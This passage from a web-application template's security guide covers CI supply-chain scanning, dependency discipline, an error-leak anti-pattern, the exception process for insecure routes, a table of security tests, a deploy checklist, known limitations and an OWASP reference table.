**Pattern (error responses):** see `packages/errors/CLAUDE.md` #4 (`onError` middleware) and #9 (no leaks in production).

**Pattern (supply chain) — CI guards:**

```yaml
# .github/workflows/ci.yml (security jobs)
jobs:
  security-scans:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: bun install --frozen-lockfile
      - uses: gitleaks/gitleaks-action@v2
      - uses: google/osv-scanner-action@v2
        with: { fail-on-vuln: true, call-analysis: all }
      - uses: semgrep/semgrep-action@v1
        with: { config: p/security-audit p/secrets p/typescript }
      - uses: SocketDev/socket-security-action@v1
        with: { api-token: ${{ secrets.SOCKET_TOKEN }} }
      - uses: github/codeql-action/analyze@v3
        with: { languages: 'javascript-typescript' }
      - run: bun run license-check
```

**Dependency discipline:**

- `bun.lock` committed and frozen in CI.
- Renovate/Dependabot configured with:
  - Auto-merge patches only for trusted packages.
  - Manual review for minor/major.
  - Security advisories expedited (24h SLA).
  - **7-day cool-off** on new versions before auto-merge (mitigates fast-propagating malicious releases).
- **No post-install scripts** allowed (`ignore-scripts = true` in `bunfig.toml` where feasible).
- Production deps audited quarterly; dev deps biannually.
- Pinning strategy: minor+patch pinned for prod-critical packages (`@gaia/auth`, `drizzle-orm`, `elysia`).

**Runtime supply-chain checks:**

- Startup check: `node_modules/` hash matches committed `bun.lock` — refuse to boot on mismatch.
- Network egress monitoring — alert on unexpected outbound connections.

**Anti-pattern:**

```ts
// ❌ Stack trace in production error
return (
  new Response(JSON.stringify({ error: err.stack }), { status: 500 })

    // ❌ Raw external error forwarded to client
    .catch((e) => c.json(e, 500))
)
```

**Enforcement:**

- Integration test — trigger internal error, verify response body has `code`, `message`, `traceId` only; no `stack`, `cause`, `env`, file paths.
- `gitleaks`, `osv-scanner`, `semgrep`, Socket.dev, CodeQL all required PR checks.
- Dependency PR requires 7-day-old version (blocks same-day merge of new releases).
- License scan blocks GPL/AGPL deps (compatibility with MIT template).

---

## The insecure path is hard (friction as feature)

Every principle above has an escape hatch. Every escape hatch requires:

1. **An ADR in `docs/adr/`** explaining why.
2. **A JSDoc `@adr ADR-XXXX` tag** on the exception.
3. **A named wrapper** (not a boolean flag) — `publicRoute`, `bypassAuth`, `allowCors`.
4. **A `/w-review` flag** — surfaces every exception in PR.

Insecurity should feel different from security. The default path (protected, validated, rate-limited, audited) should be the path of least resistance.

```ts
// ✅ Default — secure, one line
.use(protectedRoute)

// ⚠️ Insecure — visible, justified, reviewed
/** @adr ADR-0023 Login must be unauthenticated */
.use(publicRoute)

// 🚫 Would-be insecure — simply doesn't exist
// .use(noAuth) // no such API
```

---

## Testing security — the only real assurance

Security that isn't tested is assumed-secure, which is the same as insecure. `packages/security/test/` and `apps/api/test/` contain integration tests verifying each principle:

| Principle               | Test                                                                     |
| ----------------------- | ------------------------------------------------------------------------ |
| 1. Protected by default | For every route, unauth request returns 401                              |
| 2. BOLA defense         | User B cannot read User A's resources; returns 404                       |
| 3. Input validation     | Malformed/oversized/injection payloads rejected at boundary              |
| 4. Rate limits          | Flow-level limits enforced across related endpoints                      |
| 5. Session              | Cookies have correct flags; sessions rotate; revoke on password change   |
| 6. CSRF                 | Cross-origin POST without valid origin rejected                          |
| 7. CORS                 | Unlisted origin receives no CORS headers                                 |
| 8. Headers              | All required headers present on every response                           |
| 9. Secrets              | Secret in request context doesn't appear in logs or error responses      |
| 10. Audit               | Every mutation produces an audit log entry                               |
| 11. SSRF                | `safeFetch` blocks private IPs, localhost, metadata endpoints            |
| 12. LLM                 | Known prompt injection samples don't leak system prompt or execute tools |
| 13. Errors/Supply       | Stack traces absent from prod responses; CVE scan blocks merge           |

These tests run on every PR via `/w-review`. Failing security test = blocked merge, no exceptions.

---

## Boot checklist (operational)

Before the first production deploy:

- [ ] `BETTER_AUTH_SECRET` ≥ 256 bits of entropy, in Railway secrets
- [ ] `DATABASE_URL` uses SSL (`?sslmode=require`)
- [ ] All third-party API keys scoped to minimum required permissions
- [ ] `ALLOWED_ORIGINS` matches production domain(s) exactly
- [ ] `NODE_ENV=production` — triggers `useSecureCookies`, stricter CSP, redacted errors
- [ ] HSTS preload registered at hstspreload.org after verifying domain
- [ ] `report-to` CSP endpoint receiving violations
- [ ] Audit log table has restricted INSERT-only role for app
- [ ] Sentry DSN configured; `beforeSend` redacts
- [ ] PostHog + Axiom receiving structured events
- [ ] Supply chain scans green on main branch
- [ ] At least one human-in-the-loop approval flow tested for LLM mutations
- [ ] Backup + restore drill completed for Neon + audit log

---

## What Gaia does NOT defend against (known limitations)

- **Physical compromise of the deploy host** — if Railway/Cloudflare compromised, game over.
- **Compromised developer laptop** — committer credentials can bypass CI gates.
- **Social engineering of humans** — admin tricked into approving a malicious LLM action.
- **Novel prompt injection techniques** — by definition, unknown attacks work until discovered.
- **Zero-day CVEs in dependencies before scanners catch them** — 7-day cool-off helps but isn't perfect.
- **DDoS beyond single-host rate limits** — handled by Cloudflare WAF, not application code.

These are acknowledged in `docs/adr/0015-security-model.md`. Mitigations at the platform level (Cloudflare, Railway isolation) are documented but not enforced by Gaia's own code.

---

## Quick reference

| Attack category                | OWASP            | Principle               | Enforcement        |
| ------------------------------ | ---------------- | ----------------------- | ------------------ |
| Auth bypass                    | API5             | #1 Protected by default | Lint + test        |
| BOLA                           | API1             | #2 Ownership checks     | UUID + test        |
| Injection (SQL/cmd/prompt)     | Top10-A03, LLM01 | #3 + #12                | TypeBox + lint     |
| Resource exhaustion            | API4             | #4 Rate limits          | Dragonfly + test   |
| Session theft                  | Top10-A07        | #5 Cookies              | Better Auth config |
| CSRF                           | —                | #6 CSRF defense         | Better Auth + CORS |
| Cross-origin theft             | API8             | #7 CORS allowlist       | Config + lint      |
| XSS, clickjacking              | Top10-A03        | #8 Strict CSP           | Middleware + test  |
| Secret leakage                 | Top10-A02        | #9 Secrets discipline   | gitleaks + redact  |
| Undetected abuse               | Top10-A09        | #10 Audit log           | Middleware + DB    |
| SSRF                           | API7             | #11 safeFetch           | Lint + test        |
| Prompt injection               | LLM01            | #12 LLM untrust         | Multi-layer        |
| Info disclosure + supply chain | Top10-A05, A06   | #13 Error + supply      | Multiple scanners  |

---

## Cross-references

- Code principles: `.claude/skills/w-code/reference.md` (#9 security is opinionated)
- Backend patterns: `apps/api/CLAUDE.md` (route guards)
- Frontend patterns: `apps/web/CLAUDE.md` (CSP integration, server action auth)
- Database patterns: `packages/db/CLAUDE.md` (RLS, audit schema)
- Auth: `packages/auth/CLAUDE.md` (Better Auth session config)
- Errors: `packages/errors/CLAUDE.md` (uniform auth errors, error response shape)
- Observability: `packages/core/CLAUDE.md` (audit log pipeline, Sentry beforeSend)
- Adapters: `packages/adapters/CLAUDE.md` (`safeFetch`, LLM untrust)
- Audit skill: `.claude/skills/a-security/reference.md`
- ADRs: `docs/adr/0015-security-model.md`, `docs/adr/0023-public-routes-justification.md`

---

<!-- AUTO-GENERATED BELOW — do not edit manually -->

## Files

| File                | Exports                                                  |
| ------------------- | -------------------------------------------------------- |
| ai-budget.ts        | Tier, todayUtc, budgetFor, assertAiBudget, recordAiUsage |
| audit-log.ts        | AuditEntry, auditLog                                     |
| harden-check.ts     | —                                                        |
| protected-route.ts  | userRoutes, protectedRoute                               |
| public-route.ts     | healthRoutes, publicRoute                                |
| rate-limits.ts      | bucketWindow, checkRateLimit, limits, clientIp           |
| security-headers.ts | applySecurityHeaders                                     |

<!-- Generated: 2026-04-30T11:12:48.512Z -->
